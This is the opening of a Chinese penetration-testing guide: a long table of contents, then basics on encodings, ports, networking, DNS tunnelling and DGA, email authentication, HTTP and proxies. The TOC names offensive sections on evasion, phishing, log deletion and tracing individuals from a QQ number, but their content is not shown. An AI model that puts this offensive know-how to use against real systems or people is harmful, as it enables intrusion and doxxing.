![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515191227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

@[toc]
- [写在前面](#写在前面)
- [常见知识点](#常见知识点)
  - [密码学和编码](#密码学和编码)
      - [分辨是什么类型的](#分辨是什么类型的)
      - [工具介绍](#工具介绍)
    - [端口](#端口)
      - [常见端口](#常见端口)
  - [网络基础](#网络基础)
    - [术语](#术语)
      - [OSI七层协议](#osi七层协议)
      - [UDP与TCP](#udp与tcp)
      - [三次握手与四次挥手](#三次握手与四次挥手)
      - [协议](#协议)
    - [DNS](#dns)
      - [邮件协议族](#邮件协议族)
      - [邮件安全协议](#邮件安全协议)
    - [HTTP/HTTPS基础知识](#httphttps基础知识)
      - [静态与动态](#静态与动态)
        - [cookie含义](#cookie含义)
      - [访问类型](#访问类型)
      - [状态码](#状态码)
    - [代理](#代理)
    - [编程语言](#编程语言)
      - [思想](#思想)
        - [MVC](#mvc)
    - [数据库](#数据库)
      - [关系型](#关系型)
        - [关系型数据库代表](#关系型数据库代表)
          - [access](#access)
          - [mysql](#mysql)
      - [非关系型](#非关系型)
    - [Linux](#linux)
        - [权限划分](#权限划分)
        - [安装软件](#安装软件)
        - [重要目录](#重要目录)
      - [常见有用命令](#常见有用命令)
    - [windows](#windows)
      - [powshell](#powshell)
  - [常见文件含义](#常见文件含义)
- [信息收集](#信息收集)
  - [信息搜集开源项目](#信息搜集开源项目)
  - [web组成框架信息收集](#web组成框架信息收集)
    - [中间件](#中间件)
    - [源码层面收集](#源码层面收集)
      - [github](#github)
    - [CMS识别](#cms识别)
  - [特殊信息](#特殊信息)
      - [备案](#备案)
      - [特殊文件](#特殊文件)
      - [公司](#公司)
      - [网站附属产品](#网站附属产品)
    - [拓展信息收集](#拓展信息收集)
      - [子域名收集](#子域名收集)
        - [相似域名](#相似域名)
        - [方法一：爆破子域名](#方法一爆破子域名)
        - [方法二：旁站搜集](#方法二旁站搜集)
        - [方法三：证书](#方法三证书)
      - [目录爆破](#目录爆破)
        - [工具](#工具)
        - [目录爆破经验](#目录爆破经验)
        - [图像](#图像)
        - [阻塞遍历序列](#阻塞遍历序列)
  - [监控](#监控)
- [工具](#工具-1)
    - [虚拟机配置上网](#虚拟机配置上网)
  - [学会上网](#学会上网)
    - [学会用普通搜索引擎](#学会用普通搜索引擎)
    - [暗网](#暗网)
    - [google hack](#google-hack)
    - [空间搜索引擎](#空间搜索引擎)
      - [Shodan](#shodan)
      - [censys搜索引擎](#censys搜索引擎)
      - [钟馗之眼](#钟馗之眼)
      - [FoFa搜索引擎](#fofa搜索引擎)
      - [Dnsdb搜索引擎](#dnsdb搜索引擎)
  - [DNS信息收集](#dns信息收集)
    - [dig](#dig)
    - [nslookup](#nslookup)
    - [hash相关工具](#hash相关工具)
      - [识别](#识别)
      - [破解](#破解)
        - [john](#john)
        - [hashcat](#hashcat)
    - [邮箱信息](#邮箱信息)
      - [搜集](#搜集)
      - [验证是否被弃用](#验证是否被弃用)
      - [验证邮箱是否泄露了密码](#验证邮箱是否泄露了密码)
  - [综合工具](#综合工具)
    - [信息搜集](#信息搜集)
      - [电子邮件](#电子邮件)
        - [Swaks](#swaks)
      - [theHarvester](#theharvester)
      - [sparta](#sparta)
    - [扫描端口](#扫描端口)
      - [nmap](#nmap)
      - [nbtscan](#nbtscan)
      - [masscan](#masscan)
    - [抓包工具](#抓包工具)
    - [进程装包](#进程装包)
      - [Wireshark](#wireshark)
      - [Burpsuite](#burpsuite)
    - [通用漏洞扫描工具](#通用漏洞扫描工具)
      - [网站扫描](#网站扫描)
    - [Cobaltstrike](#cobaltstrike)
    - [kali](#kali)
      - [安装kali](#安装kali)
  - [社会工程](#社会工程)
  - [后门](#后门)
    - [msfvenom](#msfvenom)
      - [Cobalt Strike](#cobalt-strike)
  - [待补充：购物建议](#待补充购物建议)
    - [硬件](#硬件)
    - [服务器](#服务器)
    - [代理](#代理-1)
      - [国内](#国内)
      - [国外](#国外)
  - [你常用的](#你常用的)
    - [匿名工具](#匿名工具)
    - [开放漏洞情报](#开放漏洞情报)
    - [寻找EXP](#寻找exp)
- [web安全](#web安全)
  - [中间人攻击](#中间人攻击)
  - [反序列化（对象注入）](#反序列化对象注入)
    - [PHP序列化与反序列化](#php序列化与反序列化)
      - [无类](#无类)
      - [有类](#有类)
    - [JAVA序列化与反序列化](#java序列化与反序列化)
      - [序列化函数介绍](#序列化函数介绍)
      - [工具](#工具-2)
  - [文件操作](#文件操作)
    - [文件读取](#文件读取)
    - [文件包含](#文件包含)
      - [本地文件包含](#本地文件包含)
      - [远程协议包含](#远程协议包含)
      - [何种协议流玩法](#何种协议流玩法)
      - [防御](#防御)
    - [文件下载](#文件下载)
    - [文件上传漏洞](#文件上传漏洞)
      - [利用](#利用)
        - [+解析漏洞](#解析漏洞)
        - [+文件包含漏洞](#文件包含漏洞)
      - [逻辑漏洞](#逻辑漏洞)
        - [常规上传](#常规上传)
    - [文件删除](#文件删除)
  - [逻辑越权](#逻辑越权)
    - [越权](#越权)
      - [水平越权](#水平越权)
      - [垂直越权](#垂直越权)
      - [防御](#防御-1)
  - [登录脆弱](#登录脆弱)
    - [验证脆弱](#验证脆弱)
      - [开发者不严谨](#开发者不严谨)
        - [验证码破解](#验证码破解)
          - [弱验证码绕过](#弱验证码绕过)
          - [识别绕过](#识别绕过)
      - [登陆点暴力破解](#登陆点暴力破解)
        - [社工字典](#社工字典)
      - [常见攻击方法](#常见攻击方法)
        - [暴力破解](#暴力破解)
        - [密码喷洒攻击](#密码喷洒攻击)
        - [获得登录凭证的下一步](#获得登录凭证的下一步)
      - [防御与绕过方法](#防御与绕过方法)
        - [待补充：AI破解](#待补充ai破解)
        - [绕过双因素验证](#绕过双因素验证)
  - [CRLF 注入](#crlf-注入)
  - [宽字节注入](#宽字节注入)
  - [待整理：XXE](#待整理xxe)
    - [学习资料](#学习资料)
    - [XXE 攻击](#xxe-攻击)
      - [自动攻击工具](#自动攻击工具)
      - [手动攻击](#手动攻击)
      - [payload](#payload)
        - [读取文件](#读取文件)
        - [内网、ip、文件探测](#内网ip文件探测)
        - [引入外部实体DTD](#引入外部实体dtd)
        - [无回显读取文件](#无回显读取文件)
      - [远程文件 SSRF](#远程文件-ssrf)
      - [XXE 亿笑攻击-DOS](#xxe-亿笑攻击-dos)
    - [防御](#防御-2)
  - [RCE（远程命令执行）](#rce远程命令执行)
    - [实例：网站可执行系统命令](#实例网站可执行系统命令)
  - [数据库注入](#数据库注入)
    - [手工注入](#手工注入)
    - [制造回显](#制造回显)
      - [报错回显](#报错回显)
        - [bool类型注入](#bool类型注入)
          - [制作布尔查询](#制作布尔查询)
        - [时间SQL注入](#时间sql注入)
          - [制作时间SQL注入](#制作时间sql注入)
          - [其他数据库的时间注入](#其他数据库的时间注入)
    - [使用万能密码对登录页注入](#使用万能密码对登录页注入)
      - [用户名不存在](#用户名不存在)
      - [1. 判断是否存在注入点](#1-判断是否存在注入点)
      - [2. 判断列数](#2-判断列数)
      - [3. 信息搜集](#3-信息搜集)
    - [sql注入过程：sqlmap](#sql注入过程sqlmap)
      - [tamper 自定义](#tamper-自定义)
      - [注入插件脚本编写](#注入插件脚本编写)
    - [跨域连接](#跨域连接)
    - [SQL注入常见防御](#sql注入常见防御)
    - [绕过防御](#绕过防御)
      - [静态资源](#静态资源)
      - [爬虫白名单](#爬虫白名单)
      - [版本绕过](#版本绕过)
      - [空白](#空白)
      - [空字节](#空字节)
      - [网址编码](#网址编码)
      - [十六进制编码（HEX）](#十六进制编码hex)
      - [字符编码](#字符编码)
      - [字符串连接](#字符串连接)
      - [注释](#注释)
      - [组合](#组合)
      - [二次注入](#二次注入)
    - [注入拓展](#注入拓展)
      - [dnslog带外注入](#dnslog带外注入)
      - [json格式数据包](#json格式数据包)
      - [insert 注入](#insert-注入)
      - [加密参数](#加密参数)
      - [堆叠查询注入](#堆叠查询注入)
      - [cookie 注入](#cookie-注入)
  - [xss攻击](#xss攻击)
    - [典型用法](#典型用法)
    - [工具](#工具-3)
      - [XSStrike](#xsstrike)
      - [xss平台](#xss平台)
      - [beef-xss](#beef-xss)
    - [防御与绕过](#防御与绕过)
      - [httponly](#httponly)
      - [绕过方案](#绕过方案)
  - [CSRF](#csrf)
    - [实战](#实战)
    - [防御](#防御-3)
  - [待补充：模板注入](#待补充模板注入)
  - [SSRF](#ssrf)
    - [常见攻击](#常见攻击)
      - [图片上传](#图片上传)
  - [DDOS 攻击](#ddos-攻击)
    - [DDOS 攻击手段](#ddos-攻击手段)
  - [待补充：劫持漏洞](#待补充劫持漏洞)
    - [DNS劫持](#dns劫持)
    - [HTTP劫持](#http劫持)
    - [DLL劫持](#dll劫持)
- [绕过检测](#绕过检测)
  - [待补充：免杀](#待补充免杀)
  - [WAF绕过](#waf绕过)
      - [市面上WAF](#市面上waf)
        - [阿里云盾](#阿里云盾)
        - [宝塔](#宝塔)
        - [安全狗](#安全狗)
        - [将会流行的WAF](#将会流行的waf)
      - [市面上常见绕过工具](#市面上常见绕过工具)
    - [通用](#通用)
      - [待补充：全扫描工具](#待补充全扫描工具)
      - [流量监控](#流量监控)
        - [躲避](#躲避)
        - [经验](#经验)
    - [SQL绕过](#sql绕过)
      - [默认未开启的防御绕过](#默认未开启的防御绕过)
        - [sqlmap](#sqlmap)
        - [手动](#手动)
    - [文件上传绕过](#文件上传绕过)
      - [安全狗](#安全狗-1)
    - [xss 绕过](#xss-绕过)
    - [权限控制拦截](#权限控制拦截)
    - [其他绕过总结](#其他绕过总结)
- [经验积累](#经验积累)
  - [中间件](#中间件-1)
    - [IIS](#iis)
    - [Apache](#apache)
    - [Nginx](#nginx)
    - [tomcat](#tomcat)
  - [CMS特性](#cms特性)
    - [敏感信息搜集](#敏感信息搜集)
    - [工具](#工具-4)
      - [利用](#利用-1)
      - [弱口令](#弱口令)
    - [thinkphp5](#thinkphp5)
      - [特性](#特性)
      - [历史漏洞](#历史漏洞)
    - [dedecms](#dedecms)
      - [基本信息](#基本信息)
      - [敏感信息](#敏感信息)
  - [语言特性](#语言特性)
    - [PHP](#php)
      - [变量覆盖漏洞](#变量覆盖漏洞)
    - [JAVAWEB](#javaweb)
      - [与SQL注入有关的预编译](#与sql注入有关的预编译)
      - [JSON WEB TOKEN](#json-web-token)
        - [破解](#破解-1)
  - [蜜罐](#蜜罐)
  - [Webshell](#webshell)
- [系统漏洞](#系统漏洞)
  - [工具](#工具-5)
    - [探测工具简介](#探测工具简介)
    - [EXP工具](#exp工具)
        - [Metasploit](#metasploit)
  - [字典](#字典)
    - [制作](#制作)
    - [fuzzy](#fuzzy)
- [APP漏洞](#app漏洞)
  - [抓包](#抓包)
- [待补充：应急响应](#待补充应急响应)
- [社会工程学](#社会工程学)
  - [以假乱真](#以假乱真)
    - [站点伪造](#站点伪造)
    - [域名伪造](#域名伪造)
    - [who am i](#who-am-i)
  - [钓鱼](#钓鱼)
    - [工具](#工具-6)
    - [钓鱼手段](#钓鱼手段)
      - [宏 – Office](#宏--office)
      - [非宏的 Office 文件 —— DDE](#非宏的-office-文件--dde)
      - [隐藏的加密 payload](#隐藏的加密-payload)
      - [钓鱼 wifi](#钓鱼-wifi)
    - [定向社工](#定向社工)
  - [如何在本地查询](#如何在本地查询)
- [经验](#经验-1)
  - [知名网站](#知名网站)
  - [IP伪造](#ip伪造)
    - [攻破类似网站](#攻破类似网站)
      - [如何攻击更多人](#如何攻击更多人)
      - [网站信息查询](#网站信息查询)
    - [溯源](#溯源)
      - [很强大的溯源工具](#很强大的溯源工具)
      - [已知名字](#已知名字)
      - [已知邮箱](#已知邮箱)
        - [获取电话号码](#获取电话号码)
      - [IP 定位](#ip-定位)
      - [已知电话号码](#已知电话号码)
        - [查询社交账号](#查询社交账号)
      - [社交账号](#社交账号)
        - [查询照片EXIF](#查询照片exif)
      - [已知QQ号](#已知qq号)
        - [查询地址](#查询地址)
        - [查询电话号](#查询电话号)
        - [加被害者](#加被害者)
      - [社工库](#社工库)
  - [绕过CDN](#绕过cdn)
- [内网渗透](#内网渗透)
  - [基础](#基础)
    - [信息搜集](#信息搜集-1)
    - [获取明文密码](#获取明文密码)
      - [windows 2012](#windows-2012)
      - [windows10](#windows10)
      - [Mac](#mac)
    - [横向渗透](#横向渗透)
      - [传递爆破其他账户密码](#传递爆破其他账户密码)
      - [控制方法1：定时任务放后门](#控制方法1定时任务放后门)
      - [控制方法2：建立连接](#控制方法2建立连接)
    - [SPN](#spn)
  - [linux渗透](#linux渗透)
    - [信息搜集](#信息搜集-2)
- [杂项](#杂项)
  - [获取数据库账号密码](#获取数据库账号密码)
    - [mysql](#mysql-1)
      - [获取基本信息](#获取基本信息)
      - [获取root账号密码](#获取root账号密码)
      - [Oracle](#oracle)
    - [MssQL](#mssql)
    - [Redis](#redis)
      - [PostgreSQL](#postgresql)
  - [提权](#提权)
    - [提权准备](#提权准备)
    - [window提权](#window提权)
      - [提权准备](#提权准备-1)
      - [win2003](#win2003)
      - [win7](#win7)
      - [win2008](#win2008)
      - [Windows2008&7令牌窃取提升-本地](#windows20087令牌窃取提升-本地)
      - [不安全的服务权限配合MSF-本地权限](#不安全的服务权限配合msf-本地权限)
        - [攻击过程](#攻击过程)
      - [win2012不带引号服务路径配合MSF-Web,本地权限](#win2012不带引号服务路径配合msf-web本地权限)
        - [攻击过程](#攻击过程-1)
      - [win2012DLL劫持提权应用配合MSF-Web权限](#win2012dll劫持提权应用配合msf-web权限)
      - [Win2012烂土豆提权](#win2012烂土豆提权)
        - [提权原理](#提权原理)
        - [提权过程](#提权过程)
    - [LINUX提权](#linux提权)
      - [提权准备](#提权准备-2)
      - [SUID配置错误漏洞](#suid配置错误漏洞)
      - [压缩通配符](#压缩通配符)
      - [定时任务执行权限分配过高](#定时任务执行权限分配过高)
    - [数据库提权](#数据库提权)
      - [Mysql](#mysql-2)
        - [UDF](#udf)
        - [MOF](#mof)
        - [启动项知识点:(基于配合操作系统自启动)](#启动项知识点基于配合操作系统自启动)
        - [反弹知识点:(基于利用反弹特性命令执0行)](#反弹知识点基于利用反弹特性命令执0行)
      - [Oracle提权演示](#oracle提权演示)
      - [MssQL](#mssql-1)
        - [使用xp_emdshell进行提权](#使用xp_emdshell进行提权)
        - [SQL sever 沙盒提权](#sql-sever-沙盒提权)
      - [Redis](#redis-1)
        - [Redis数据库权限提升](#redis数据库权限提升)
      - [PostgreSQL](#postgresql-1)
- [代码审计](#代码审计)
  - [phpweb](#phpweb)
    - [一键审计](#一键审计)
    - [数据库监控](#数据库监控)
    - [常规代码审计](#常规代码审计)
  - [JAVAWEB](#javaweb-1)
    - [基础开发知识](#基础开发知识)
    - [审计](#审计)
      - [手动](#手动-1)
      - [工具](#工具-7)
- [待补充：物理攻击](#待补充物理攻击)
  - [wifi](#wifi)
  - [](#)
- [待补充：隐藏技术](#待补充隐藏技术)
  - [实用工具](#实用工具)
    - [日志删除](#日志删除)
- [下一步](#下一步)
  - [渗透发展](#渗透发展)
    - [自动化](#自动化)
  - [待整理：个人发展与规划](#待整理个人发展与规划)
    - [找工作](#找工作)
    - [如何赚钱](#如何赚钱)
      - [靠技术](#靠技术)
      - [技术沾边](#技术沾边)
    - [自学](#自学)
      - [刷题](#刷题)
      - [社区](#社区)
  - [知名机构](#知名机构)
  - [社区](#社区-1)
    - [黑客组织和官网](#黑客组织和官网)
  - [期刊](#期刊)
  - [大会](#大会)
  - [导航](#导航)
  - [游戏](#游戏)
    - [红蓝对抗](#红蓝对抗)
  - [图书推荐](#图书推荐)
  - [博客](#博客)
  - [如何修成](#如何修成)
      - [成为什么样的人](#成为什么样的人)
# 写在前面

**作者：北丐**

**qq交流群：942443861，（8.15后）会在群里发放渗透资料**

文章链接：https://github.com/ngadminq/Bei-Gai-penetration-test-guide


本文开始于2021/4/27
预计2022年完成


很抱歉，这篇文章你看到的时候还是粗糙的，文章更改可能出现在各个章节，文章**约一周发布2次左右更新版本。**
在github显示与排版效果似乎不好，可以下载[typora](https://typora.io/)与md文件，将md用typora打开，可以看到目录树。如下图是软件打开效果。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720144245627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
哈哈哈，对了发现一个问题，因为文章文本含有不少漏洞后门代码，这可能导致你的查杀软件当做异常。不过不用担心我是不是有恶意，因为我不会伤害我的任何一位读者。善用crtl+F，对关键字进行快速定位。学习时可自行按照自己喜欢的顺序，并不一定要严格按照我的文章目录。
另外请记得同步我的最新文章，它总是比上一个版本更好。


我热爱分享，文章可能有的部分对于你有帮助有的没有，选来用。请善待我的努力和分享精神。食用这篇文章的最好方法就是每次有新收获去在指定章节完善它。所以如果你有热情跟我一起进步，有责任心自始至终的完成这篇文章，那么请加群联系我吧。

# 常见知识点

只介绍常见和必备基础不涉及到深度

## 密码学和编码


**常用加密方式**
对于网站常用base64对url中id进行加密
对于数据库密码常用md5加密

**对称加密与非对称**
对称加密是最快速、最简单的一种加密方式，加密与解密用的是同样的密钥。常见的对称加密算法：DES，AES等。
非对称加密为数据的加密与解密提供了一个非常安全的方法，它使用了一对密钥，公钥和私钥。私钥只能由一方安全保管，不能外泄，而公钥则可以发给任何请求它的人。非对称加密使用这对密钥中的一个进行加密，而解密则需要另一个密钥。最常用的非对称加密算法：RSA
#### 分辨是什么类型的

互联网只接受 ASCII 格式的 URL，URL 编码需要对 URL 字符集的某些部分进行编码。此过程将一个字符转换为一个字符三元组，其前缀为“%”，后跟两个十六进制格式的数字。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628204319808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628210715235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
md5:任意长度的数据，算出的MD5值长度都是固定的，一般是32位也有16位。由数字大小写混成。密文中字母大小写不会影响破解结果

如何分辨base64【主要应用在web中用于对源码的加密或者用户名或者密码的加密】
长度一定会被4整除
很多都以等号结尾(为了凑齐所以结尾用等号)，当然也存在没有等号的base64
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628205659976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
除了base64你可能还会遇到base32,base16
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714140947269.png)


**AES**
AES最重要的是在base64基础上增加了两个参数即：密码和偏移；现在很多CTF也会有AES编码的题的，但都是给了这两个参数的值，不给的话神仙也解不出来
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628212205816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

HEX编码
HEX编码又叫十六进制编码，是数据的16进制表达形式，是计算机中数据的一种表示方法。同我们日常中的十进制表示法不一样。它由0-9，A-F组成。与10进制的对应关系是：0-9对应0-9，A-F对应10-15。同样以“https://mp.toutiao.com”头条号主页地址为例，经过HEX编码后结果如下图所示：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521203017826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


密钥：如果加密密钥和解密密钥相同，那么这种密码算法叫做对称密码算法，这个比较好理解，符合正常的逻辑，一把钥匙对一把锁嘛；另外一类，正好相反，也就是加密密钥和解密密钥不相同，这种密码算法叫做非对称密码算法，也叫公钥密码算法，




#### 工具介绍

加密工具
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628202608911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
解密工具
一些网站研究出了算法来允许破解md5比如cmd5，你获取到如下数据库密码时，你可以注意到这个密码还采用了salt加盐，因此你在使用cmd5时应注意调参
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628225351540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 端口
范围：0-65535
固定端口：0-1023 1024保留
动态端口：1024-65535
#### 常见端口
**常见端口**
http:80
https:443
ftp:20/21

**危险端口**
SMB：445	永恒之蓝

**数据库端口**
mysql：3306
oracle：1521
postgrsql：5432
derby：1527
SQL Server：1433
DB2：50000
sybase：5000
mongoDB：27017
Redis:6379





## 网络基础

### 术语

 **同源策略**

同源：协议、域名、端口都一样就是同源
 ~ http、https、 
 ~ a.com、b.com
 ~ url:80、url:90
 
**CDN**
 cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。


#### OSI七层协议

**物理层**
传输对象：比特流
作用：从数据链路层接收帧，将比特流转换成底层物理介质上的信号
**数据链路层**
传输对象：帧
作用：在网络层实体间提供数据传输功能和控制
**网络层**
作用：负责端到端的数据的路由或交换，为透明地传输数据建立连接
**传输层**
作用：接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地
**会话层**
作用：提供提供节点之间通信过程的协调
**表示层**
传输对象：针对不同应用软件的编码格式
作用：提供数据格式、变换和编码转换
**应用层**
传输对象：各种应用如电子邮件、文件传输等

#### UDP与TCP

协议开销小、效率高。
UDP是无连接的，即发送数据之前不需要建立连接。


TCP提供了一种可靠、面向连接、字节流、传输层的服务，采用三次握手建立一个连接。采用4次挥手来关闭一个连接。

#### 三次握手与四次挥手
ACK报文是用来应答的，SYN报文是用来同步的
****
当连接建立时，有：

客户端 ------SYN----> 服务器

客户端 <---ACK+SYN---- 服务器

客户端 ------ACK----> 服务器
****

当终止到来时，有：

客户端------FIN---->服务器

客户端 <-----ACK------ 服务器 

客户端 <-----FIN------ 服务器 

客户端 ------ACK----> 服务器

#### 	协议
**ICMP**
icmp是Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。
**DHCP**
动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。
![在这里插入图片描述](https://img-blog.csdnimg.cn/cbb0a34b02bf4711919c5b4da792d23b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### DNS


**DNS解析过程**
DNS解析过程是递归查询的，具体过程如下：

用户要访问域名www.example.com时，先查看本机hosts是否有记录或者本机是否有DNS缓存，如果有，直接返回结果，否则向递归服务器查询该域名的IP地址
递归缓存为空时，首先向根服务器查询com顶级域的IP地址
根服务器告知递归服务器com顶级域名服务器的IP地址
递归向com顶级域名服务器查询负责example.com的权威服务器的IP
com顶级域名服务器返回相应的IP地址
递归向example.com的权威服务器查询www.example.com的地址记录
权威服务器告知www.example.com的地址记录
递归服务器将查询结果返回客户端


**DGA**
DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成C&C域名，从而逃避域名黑名单检测的技术手段，常见于botnet中。一般来说，一个DGA域名的存活时间约在1-7天左右。

通信时，客户端和服务端都运行同一套DGA算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变IP技术，快速变换IP，从而域名和IP都可以进行快速变化。

DGA域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。

 **DNS隧道**
DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。




#### 邮件协议族

 **SMTP**
SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用SSL时端口号为25，启用SSL时端口号多为465或994。

以HTTP协议举例，HTTP协议中有状态码的概念，用于表示当前请求与响应的状态，通过状态码可以定位可能的问题所在，SMTP与HTTP非常相似，都是明文协议。早期SMTP协议的开发初衷是为了解决一个大学中实验室成员进行通信、留言的问题，但随着互联网的发展，SMTP的应用越来越广泛。
在SMTP协议中，也有状态码的概念，与HTTP协议相同，250表示邮件传送成功。整个SMTP报文分为两类：
信封
信的内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210621125439191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

 **POP3**
POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用SSL时端口号为110，启用SSL时端口号多为995。

 **IMAP**
IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用SSL时端口号为143，启用SSL时端口号多为993。

#### 邮件安全协议

SMTP相关安全协议 - SPF
发件人策略框架(Sender Policy Framework , SPF)是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。

https://www.ietf.org/rfc/rfc4408.txt

"v=spf1 mx ip4:61.0.2.0/24 ~all"

设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。

SMTP相关安全协议 - DKIM
DKIM是为了防止电子邮件欺诈的一种技术，同样依赖于DNS的TXT记录类型。这个技术需要将发件方公钥写入域名的TXT记录，收件方收到邮件后，通过查询发件方DNS记录找到公钥，来解密邮件内容。

https://tools.ietf.org/html/rfc6376

SMTP相关安全协议 - DMARC
DMARC（Domain-based Message Authentication, Reporting & Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。

![2020-02-05-07-06-09](https://img-blog.csdnimg.cn/20210621124953351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


https://en.wikipedia.org/wiki/DMARC#Alignment

### HTTP/HTTPS基础知识


#### 静态与动态

静态网页：最常用的格式文件就是html格式文件，大部分网页的格式都是html格式，html格式又包含有.htm、dhtml.xhtml.shtm.shtml。这些都是指静态页面，里面不含有动态程序。

动态网页：页面级包括有ASP（基于JavaScript 或VbScript或C#）、JSP、PHP、ASPX、jspx、cgi。这些里面是包含服务器端执行的代码，也就是服务器在将这些网页发给客户端之前，会先执行里面的动态程序语言，并把执行后生成的html发送到客户端来的，所以我们在客户端看到的源代码也是html格式的。

index.php（做个例子实际下index没太大意义）和网页展示的php通常不会是一样文件(网页只有js或html源码和F12结果是一样的，这可以用来判断一些网站是做前端验证还是服务器验证)，前者源码包含的文件更多，后者是解析后的文件。

##### cookie含义

httponly：限制Cookie仅在HTTP传输过程中被读取，一定程度上防御XSS攻击。

#### 访问类型

get传参与post传参的区别
 -- get限制传参长度、post没有限制
 -- get在url可见、post相对隐蔽（但是抓包都一样）

#### 状态码

30X（移动） 
403（禁止） 权限不够，服务器拒绝请求。
404（未找到）

HTTPS多了SSL层，但一般而言这对于黑客而言于事无补。因为我们仍旧可以通过替换、伪造SSL证书或SSL剥离达到中间人攻击目的。

小网站通常买不起SSL证书，所以这些网站会签订私人的SSL证书，私人的SSL证书会提示网站是私密链接

### 代理

代理分为正向和反向。
正向代理：代理位于客户端和服务器之间，为了从服务器取得内容，客户端向代理发送一个请求并指定目标(服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。
比如你在国内利用代理访问谷歌，在家利用代理访问公司内网等，这些就是正向代理。服务器每次记录时是在记录你的代理，这就达到了简单匿名效果。
